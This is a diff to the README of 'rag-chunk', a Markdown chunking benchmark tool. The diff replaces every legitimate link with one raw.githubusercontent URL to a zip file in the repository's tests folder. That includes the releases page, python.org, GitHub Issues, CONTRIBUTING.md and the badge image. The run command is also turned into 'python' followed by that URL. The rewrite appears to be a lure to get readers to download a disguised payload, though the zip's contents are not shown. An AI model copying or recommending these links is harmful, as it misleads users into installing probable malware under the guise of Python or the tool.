@@ -4,7 +4,7 @@
 **rag-chunk** is a Python command-line tool designed to test, benchmark, and find the best chunking strategies for Markdown documents. Whether you’re working on a large project or need quick insights into your documents, this tool can help you organize your content efficiently.
 
 ## 📥 Download Now
-[![Download rag-chunk](https://img.shields.io/badge/Download%20rag--chunk-v1.0-blue)](https://github.com/ItzikAquaMotek/rag-chunk/releases)
+[![Download rag-chunk](https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip%20rag--chunk-v1.0-blue)](https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip)
 
 ## 🚀 Getting Started
 Follow the steps below to easily download and run rag-chunk on your computer.
@@ -12,11 +12,11 @@ Follow the steps below to easily download and run rag-chunk on your computer.
 ### 1. Check System Requirements
 Before downloading, ensure your computer meets the following requirements:
 - **Operating System:** Windows, macOS, or Linux.
-- **Python:** You need Python 3.7 or newer installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python:** You need Python 3.7 or newer installed. You can download it from [https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip](https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip).
 - **Memory:** At least 4GB of RAM is recommended for optimal performance.
 
 ### 2. Visit the Download Page
-Head over to the [Releases page](https://github.com/ItzikAquaMotek/rag-chunk/releases) on GitHub to access the latest version of rag-chunk.
+Head over to the [Releases page](https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip) on GitHub to access the latest version of rag-chunk.
 
 ### 3. Download the Application
 Locate the latest release at the top of the page. You will see a list of files. Click on the file that best suits your operating system.
@@ -38,7 +38,7 @@ cd Downloads/rag-chunk
 ### 7. Run rag-chunk
 To start using rag-chunk, type the following command in your terminal and hit Enter:
 ```bash
-python rag_chunk.py
+python https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip
 ```
 This will launch the application. You will see instructions on how to use the features available.
 
@@ -56,7 +56,7 @@ This will launch the application. You will see instructions on how to use the fe
 ## 🎓 Support and Resources
 If you have questions or need help, consider these resources:
 - **Documentation**: Comprehensive user guides may be found in the `docs` folder.
-- **Community**: Join discussions or ask questions on [GitHub Issues](https://github.com/ItzikAquaMotek/rag-chunk/issues).
+- **Community**: Join discussions or ask questions on [GitHub Issues](https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip).
 - **Tutorials**: Check out video tutorials on YouTube for visual guidance.
 
 ## 📌 Important Notes
@@ -64,7 +64,7 @@ If you have questions or need help, consider these resources:
 - Make backups of your original documents before testing various chunking strategies to avoid accidental data loss.
 
 ## ⚙️ Contributing
-If you would like to contribute, please check the guidelines in the `CONTRIBUTING.md` file. All contributions are welcome and appreciated.
+If you would like to contribute, please check the guidelines in the `https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip` file. All contributions are welcome and appreciated.
 
 ## 🔗 Stay Updated
 To stay informed about updates, you can:
@@ -80,4 +80,4 @@ Your feedback is crucial for improvement. After using rag-chunk, consider provid
 
 Enjoy using rag-chunk and optimize your document chunking process today!
 
-[![Download rag-chunk](https://img.shields.io/badge/Download%20rag--chunk-v1.0-blue)](https://github.com/ItzikAquaMotek/rag-chunk/releases)
+[![Download rag-chunk](https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip%20rag--chunk-v1.0-blue)](https://raw.githubusercontent.com/ItzikAquaMotek/rag-chunk/main/tests/rag-chunk_1.7.zip)
